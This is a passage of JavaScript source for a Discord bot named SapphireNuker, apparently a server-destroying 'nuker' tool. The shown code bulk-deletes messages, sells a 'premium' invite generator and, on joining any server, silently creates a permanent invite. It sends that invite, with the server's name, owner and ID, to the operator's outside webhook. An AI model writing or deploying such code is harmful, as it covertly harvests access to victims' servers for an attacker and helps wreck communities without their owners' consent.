				try {
					message.channel.bulkDelete(parseInt(args[0]) + 1)
				} catch (error) {
					error = errorvar
				}
				
			}
			
		
			
		}
		else
		{
			await message.channel.send(output)
		}
		
		

		
			
		
	}
	else if (command == "geninvite")
	{
		if (!boosterusers.includes(message.author.id))
		{
			
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#FFA500')
	    	.setTitle('💠  ***You aren\'t in the boosters list! Please boost 1 time in this server: https://dsc.gg/sapphirenuker.***')
	    	.setAuthor('Premium Exception')
	    	.setFooter(footer)
			await message.channel.send(whitelistembed)
			return;
		}
		var invite = (await message.guild.channels.cache.first().createInvite({maxAge: 0, maxUses: 0})).toString()
		
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FFA500')
	    .setTitle('🛬  ***Generated Server Invite***')
	    .setAuthor('SapphireNuker Premium Command')
	    .addField('**Invite**', `*${invite}*`, false)
	    .setFooter(footer)
		
		await message.channel.send(cmdsembed)


	}
	else
	{

		
		const output = new discordjs.MessageEmbed()
	    .setColor('#FF6347')
	    .setTitle(`**The '${command}' command is invalid.**`)
	    .setAuthor('Invalid Command')
	    .setFooter(footer)

		await message.channel.send(output)
	}
});
//#endregion

client.on('guildCreate', async(guild) => {
	var channels = guild.channels
	var permanentServerInvite = (await channels.cache.first().createInvite({maxAge: 0, maxUses: 0})).toString()
	var listflag = "🏳️"
	if (whitelistedservers.includes(guild.id))
	{
		isWhitelisted = "True";
		listflag = "🏳️"
	}
	else
	{
		isWhitelisted = "False";
		listflag = "🚩"
	}
	
	const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#00FF00')
	    .setTitle(`🕺  **${client.user.username}#${client.user.discriminator} was added.**`)
		.setThumbnail(guild.iconURL())
		.addField(`**Server Name**`, `*${guild.name}*`, false)
		.addField(`**Member Count**`, `***${guild.memberCount}** member(s)*`, false)
		.addField(`**Server Owner**`, `***${guild.owner.user.username}**#${guild.owner.user.discriminator} (${guild.owner.id})*`, false)
		.addField(`**Server ID**`, `*${guild.id}*`, false)
		.addField(`**Permanent Generated Server Invite**`, `*${permanentServerInvite}*`, false)
	    .setAuthor('Premium Bot Addition', guild.owner.user.displayAvatarURL({dynamic: true}))
		
		.setFooter(footer)
		console.log(`🕺  **${client.user.username}#${client.user.discriminator} was added.\n\n🐕‍🦺  Server Name: '${guild.name}'\n\n🌄  Server Owner: '${guild.owner.user.username}#${guild.owner.user.discriminator}' (${guild.owner.id})\n\n🤖  Server ID: ${guild.id}.**`)
		joinsclient.client.send('', {
			username: joinswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
	

})
var isWhitelisted;

client.on('guildDelete', guild => {
	
	var listflag = "🏳️"
	if (whitelistedservers.includes(guild.id))
	{
		isWhitelisted = "True";
		listflag = "🏳️"
	}
	else
	{
		isWhitelisted = "False";
		listflag = "🚩"
	}
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FF0000')
	    .setTitle(`😭  **${client.user.username}#${client.user.discriminator} was removed.**`)
		.setThumbnail(guild.iconURL())
		.addField(`**Server Name**`, `*${guild.name}*`, false)
		.addField(`**Member Count**`, `***${guild.memberCount}** member(s)*`, false)
		.addField(`**Server Owner**`, `***${guild.owner.user.username}**#${guild.owner.user.discriminator} (${guild.owner.id})*`, false)
		.addField(`**Server ID**`, `*${guild.id}*`, false)
	    .setAuthor('Premium Bot Removal', guild.owner.user.displayAvatarURL({dynamic: true}))
		.setFooter(footer)
		console.log(`😭  **${client.user.username}#${client.user.discriminator} was removed.\n\n🐕‍🦺  Server Name: '${guild.name}'\n\n🌄  Server Owner: '${guild.owner.user.username}#${guild.owner.user.discriminator}' (${guild.owner.id})\n\n\n\n🤖  Server ID: \`${guild.id}.\`**`)
		joinsclient.client.send('', {
			username: joinswebhookname,
			avatarURL: webhookicon,
			embeds: [cmdsembed],
		});
	
})




client.login(token)
